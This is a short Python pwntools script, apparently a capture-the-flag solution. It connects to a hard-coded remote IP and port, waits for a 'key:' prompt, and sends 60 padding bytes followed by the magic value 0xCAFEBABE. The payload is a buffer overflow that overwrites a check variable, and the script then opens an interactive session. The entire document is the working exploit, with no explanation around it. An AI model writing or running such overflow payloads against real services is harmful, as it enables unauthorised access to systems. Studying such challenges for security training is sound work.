from pwn import *

r = remote("65.2.136.80", 31905)
r.recvuntil('key: ')
r.send(b'a'*60+b'\xBE\xBA\xFE\xCA')
r.interactive()
